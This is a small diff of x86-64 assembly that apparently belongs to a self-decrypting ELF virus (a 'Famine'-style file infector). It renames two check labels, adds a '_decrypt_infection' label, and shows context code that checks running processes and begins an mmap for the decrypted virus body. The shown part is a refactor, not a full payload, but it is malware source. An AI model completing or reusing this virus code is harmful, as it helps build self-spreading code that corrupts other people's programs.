@@ -85,13 +85,13 @@ _check_processus:
 
 _check_alternate_start:
 	cmp QWORD [rsp + 136], 3
-	jne _test_reg
+	jne _check_alternate_by_registers
 	mov rdi, QWORD [rsp + 152]
 	lea r10, [rel _verif]
 	mov r10, QWORD [r10]
 	cmp QWORD [rdi], r10
 	je _force_exit
-_test_reg:
+_check_alternate_by_registers:
 	cmp QWORD [rsp + 64], 3
 	jne _verify_o_entry
 	mov rdi, QWORD [rsp + 72]
@@ -134,6 +134,7 @@ _check_famine_binary:
 ; Dont forget that the decrypted part is on an MMAP. That's why we need to copy the entire file,
 ; to use the relative addr of the functions, like _o_entry and _string.
 
+_decrypt_infection:
 ; Mmap, for the decrypted virus
 	mov rax, SYS_MMAP
 	mov rdi, 0
